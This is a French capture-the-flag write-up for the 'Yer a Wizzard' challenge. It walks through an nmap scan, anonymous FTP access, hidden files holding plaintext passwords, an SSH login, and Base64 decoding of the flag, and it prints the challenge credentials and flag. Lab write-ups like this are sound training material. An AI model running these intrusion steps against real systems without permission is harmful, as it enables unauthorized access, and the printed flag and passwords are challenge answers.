# Yer a Wizzard

## Contexte
- **Nom du challenge** : Yer a Wizzard
- **Catégorie** : Cracking
- **Difficulté** : Easy

---

## 1. Reconnaissance

Scan complet des ports avec leurs services et scripts par défaut :

```bash
nmap -sV -sC -p- <IP>
```

Résultat :

```
21/tcp open  ftp
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh
```

Deux services ressortent :
- **FTP (21)** : connexion **anonyme autorisée** → accès sans identifiants.
- **SSH (22)** : point d'entrée potentiel pour obtenir un shell une fois des identifiants trouvés.

---

## 2. Analyse / Identification de la vulnérabilité

La faille principale est une **mauvaise configuration du FTP** : le login anonyme est
activé, ce qui permet à n'importe qui de se connecter et de lire les fichiers du serveur.
Ces fichiers contiennent des **identifiants en clair** (fuite d'informations sensibles),
qui vont ensuite permettre de se connecter en SSH.

---

## 3. Exploitation

### 3.1 Accès FTP anonyme

Connexion au FTP avec l'utilisateur `anonymous` (aucun mot de passe requis) :

```bash
ftp <IP>
# user : anonymous
# password : (vide)
```

Une fois connecté, j'affiche **tous** les fichiers, y compris les cachés :

```bash
ls -la
```

Je trouve un dossier `...` et un fichier `.hidden`.
Dans le dossier `...` se cache encore un fichier `.reallyHidden`.

Je récupère les deux fichiers :

```bash
get .hidden
get .../.reallyHidden
```

Contenu de `.hidden` :

```
I swear that my password is Il0veTheMalefoys, trust me, I'm Hagrid, I never lie!
```

Contenu de `.reallyHidden` :

```
FINE! My password is IAlreadySaidTooMuch
```

**Analyse** : l'utilisateur est vraisemblablement `hagrid`, et deux mots de passe
possibles se dégagent :
- `Il0veTheMalefoys`
- `IAlreadySaidTooMuch`

### 3.2 Accès SSH (premier accès utilisateur)

Je teste les identifiants en SSH. Avec `Hagrid` (majuscule) les deux mots de passe
échouent. En essayant avec un **`h` minuscule**, ça fonctionne :

```bash
ssh hagrid@<IP>
# password : IAlreadySaidTooMuch
```

Une fois connecté, je récupère le flag utilisateur :

```bash
cat user.txt
```

Contenu :

```
VWxaQ1NtVjZRblZOTVRseVdWVTFabUpxVGpKTk1VcG1ZVWRHVjAweE9IcGlha0pXVDFWb1prNVVRa1JUZWtvNVEyYzlQUT09
```

---

## 4. Décodage du flag

Le contenu de `user.txt` n'est pas le flag directement : c'est une chaîne encodée
**plusieurs fois en Base64** (elle se termine par des motifs typiques du Base64,
et chaque décodage donne encore du Base64 finissant par `==`).

Je décode successivement :

```bash
echo "VWxaQ1NtVjZRblZO..." | base64 -d
# -> UlZCSmV6QnVNMTlyWVU1ZmJqTjJNMUpmYUdGV00xOHpiakJWT1VoZk5UQkRTeko5Q2c9PQ==

echo "UlZCSmV6QnVNMTly..." | base64 -d
# -> RVBJezBuM19rYU5fbjN2M1JfaGFWM18zbjBVOUhfNTBDSzJ9Cg==

echo "RVBJezBuM19rYU5f..." | base64 -d
# -> EPI{0n3_kaN_n3v3R_haV3_3n0U9H_50CK2}
```


---

## 5. Flag

```
EPI{0n3_kaN_n3v3R_haV3_3n0U9H_50CK2}
```

**Emplacement** : fichier `user.txt` dans le home de l'utilisateur `hagrid`, obtenu après
connexion SSH, puis décodé 3 fois en Base64.

---

## Outils utilisés
- `nmap` — scan des ports et détection de services
- `ftp` — connexion au serveur FTP anonyme
- `ssh` — accès distant à la machine
- `base64` — décodage du flag

## Techniques utilisées
- **Énumération** de ports et services (nmap)
- Exploitation d'une **mauvaise configuration FTP** (login anonyme)
- Découverte de **fichiers cachés** (`ls -la`)
- **Fuite d'identifiants en clair**
- **Décodage / cracking** (Base64 multi-passes)
